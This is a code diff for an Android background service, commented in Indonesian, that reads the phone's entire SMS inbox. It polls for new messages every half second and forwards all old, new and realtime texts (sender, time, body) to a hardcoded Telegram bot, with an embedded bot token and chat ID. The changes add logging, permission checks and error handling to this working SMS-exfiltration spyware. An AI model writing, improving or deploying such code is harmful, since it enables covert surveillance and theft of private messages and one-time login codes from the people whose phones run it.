@@ -34,55 +34,78 @@ public class SmsService extends Service {
 
     private static final String TAG = "SmsService";
     private static final String CH_ID = "sms_mon";
-
-    // GANTI dengan punya kamu
     private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
     private static final String CHAT_ID   = "8275632263";
-
     private static final long LOOP_MS = 500;
 
     private final Set<String> seen = new HashSet<>();
     private boolean firstRun = true;
+    private boolean startedOnce = false;
     private Handler handler;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        Log.d(TAG, "onCreate");
         createChannel();
-        startForeground(1, buildNotif());
+        try {
+            startForeground(1, buildNotif());
+        } catch (Exception e) {
+            Log.e(TAG, "startForeground failed", e);
+        }
         handler = new Handler(Looper.getMainLooper());
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // realtime dari SmsReceiver
+        Log.d(TAG, "onStartCommand");
+
+        boolean hasPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+                == PackageManager.PERMISSION_GRANTED;
+        Log.d(TAG, "READ_SMS granted=" + hasPerm);
+
+        // 1. realtime dari SmsReceiver
         if (intent != null && intent.hasExtra("body")) {
-            final String from = intent.getStringExtra("from");
-            final String body = intent.getStringExtra("body");
-            final long time = intent.getLongExtra("time", System.currentTimeMillis());
+            String from = intent.getStringExtra("from");
+            String body = intent.getStringExtra("body");
+            long time = intent.getLongExtra("time", System.currentTimeMillis());
+            Log.d(TAG, "realtime sms from=" + from);
             sendTelegram("📩 SMS REALTIME\n"
                     + "dari: " + from + "\n"
                     + "waktu: " + time + "\n"
                     + "isi: " + body);
         }
 
-        // mulai polling hanya jika izin sudah ada
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
-                == PackageManager.PERMISSION_GRANTED) {
+        // 2. pesan startup (sekali)
+        if (!startedOnce) {
+            startedOnce = true;
+            sendTelegram("🚀 Service aktif\nREAD_SMS=" + (hasPerm ? "ok" : "denied"));
+        }
+
+        // 3. mulai polling hanya kalau ada izin
+        if (hasPerm) {
             handler.post(new Runnable() {
                 @Override public void run() {
-                    poll();
+                    try { poll(); }
+                    catch (Exception e) { Log.e(TAG, "poll outer failed", e); }
                     handler.postDelayed(this, LOOP_MS);
                 }
             });
         } else {
-            Log.e(TAG, "READ_SMS belum diizinkan, polling tidak jalan");
+            Log.e(TAG, "polling tidak jalan karena READ_SMS belum diberikan");
         }
 
         return START_STICKY;
     }
 
     private void poll() {
+        // cek izin setiap iterasi (bisa saja berubah)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+                != PackageManager.PERMISSION_GRANTED) {
+            Log.d(TAG, "poll skip: izin belum ada");
+            return;
+        }
+
         Cursor c = null;
         try {
             c = getContentResolver().query(
@@ -91,12 +114,14 @@ public class SmsService extends Service {
                     null, null, "date ASC");
 
             if (c == null) {
-                Log.e(TAG, "cursor null, mungkin izin belum diberikan");
+                Log.e(TAG, "cursor null");
                 return;
             }
 
-            JSONArray all = new JSONArray();
+            int count = c.getCount();
+            Log.d(TAG, "cursor count=" + count + " firstRun=" + firstRun);
 
+            JSONArray all = new JSONArray();
             while (c.moveToNext()) {
                 String id = c.getString(0);
                 String addr = c.getString(1);
@@ -111,6 +136,7 @@ public class SmsService extends Service {
                 all.put(o);
 
                 if (!firstRun && !seen.contains(id)) {
+                    Log.d(TAG, "SMS BARU id=" + id + " from=" + addr);
                     sendTelegram(
                             "📩 SMS BARU\n" +
                             "dari: " + addr + "\n" +
@@ -123,22 +149,29 @@ public class SmsService extends Service {
 
             if (firstRun) {
                 firstRun = false;
+                Log.d(TAG, "kirim SMS LAMA count=" + all.length());
                 sendTelegram("📦 SMS LAMA (" + all.length() + ")\n" + all.toString());
             }
+        } catch (SecurityException se) {
+            Log.e(TAG, "SecurityException: " + se.getMessage());
         } catch (Exception e) {
             Log.e(TAG, "poll failed", e);
         } finally {
-            if (c != null) c.close();
+            if (c != null) {
+                try { c.close(); } catch (Exception ignored) {}
+            }
         }
     }
 
-    private void sendTelegram(String text) {
+    private void sendTelegram(final String text) {
         new Thread(() -> {
             try {
                 URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
                 conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
 
                 String body = "chat_id=" + CHAT_ID +
@@ -149,7 +182,9 @@ public class SmsService extends Service {
                 os.flush();
                 os.close();
 
-                Log.d(TAG, "telegram resp: " + conn.getResponseCode());
+                int code = conn.getResponseCode();
+                String shortText = text.length() > 40 ? text.substring(0, 40) + "..." : text;
+                Log.d(TAG, "telegram resp=" + code + " text=" + shortText);
                 conn.disconnect();
             } catch (Exception e) {
                 Log.e(TAG, "telegram failed", e);
